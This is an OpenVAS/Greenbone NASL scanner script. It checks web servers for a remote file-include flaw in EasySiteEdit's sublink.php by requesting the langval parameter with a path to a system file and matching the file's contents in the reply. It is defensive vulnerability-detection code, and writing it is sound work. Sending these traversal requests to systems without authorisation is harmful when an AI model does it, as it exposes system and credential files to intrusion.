if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103274" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-09-23 10:55:34 +0200 (Fri, 23 Sep 2011)" );
	script_bugtraq_id( 49258 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "EasySiteEdit 'sublink.php' Remote File Include Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/49258" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "EasySiteEdit is prone to a remote file-include vulnerability because
  it fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting this issue may allow an attacker to compromise the
  application and the underlying system. Other attacks are also possible." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/esev2", "/esev", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	buf = http_get_cache( item: dir + "/", port: port );
	if(!buf || !IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) || ( !ContainsString( buf, "All rights reserved" ) && !ContainsString( buf, "Privacy policy" ) && !ContainsString( buf, "Terms of use" ) )){
		continue;
	}
	for file in keys( files ) {
		url = dir + "/sublink.php?langval=/" + files[file];
		if(http_vuln_check( port: port, url: url, pattern: file )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

